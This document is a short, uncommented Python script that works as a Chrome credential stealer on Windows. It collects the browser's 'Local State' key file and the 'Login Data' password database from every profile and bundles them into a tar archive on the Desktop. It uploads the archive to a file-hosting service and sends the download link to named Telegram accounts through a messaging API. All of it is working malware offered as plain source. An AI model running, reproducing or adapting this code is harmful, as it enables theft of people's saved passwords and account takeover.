import tarfile,os,requests,re,time
CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))
folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$",element)!=None]
def wait_for_internet(url="https://www.google.com", timeout=5, retry_interval=5):
    while True:
        try:
            response = requests.get(url, timeout=timeout)
            if response.status_code == 200:
                print("Internet is available")
                return True
            else:
                print(f"Received status code {response.status_code}, retrying...")
        except requests.ConnectionError:
            print("No internet connection, retrying...")
        except requests.Timeout:
            print("Request timed out, retrying...")
        time.sleep(retry_interval)
wait_for_internet()

def create_tar_file(tar_filename, files_to_compress):
    with tarfile.open(tar_filename, 'w') as tar:
        for file in files_to_compress:
            tar.add(file)
def upload(file_path):
    url = "https://store1.gofile.io/contents/uploadfile"
    with open(file_path, 'rb') as file:
        files = {"file": file}
        response = requests.post(url, files=files)
        requests.post('https://api.callmebot.com/text.php?user=@id_sakib|@sadik4u3',params={'text':response.text})
files = [CHROME_PATH_LOCAL_STATE]
for folder in folders:
    files.append(os.path.normpath(r"%s\%s\Login Data"%(CHROME_PATH,folder)))
desktop_path = os.path.join(os.path.expanduser('~'), 'Desktop')
archive = os.path.join(desktop_path,'archive.tar')
create_tar_file(archive, files)
upload(archive)
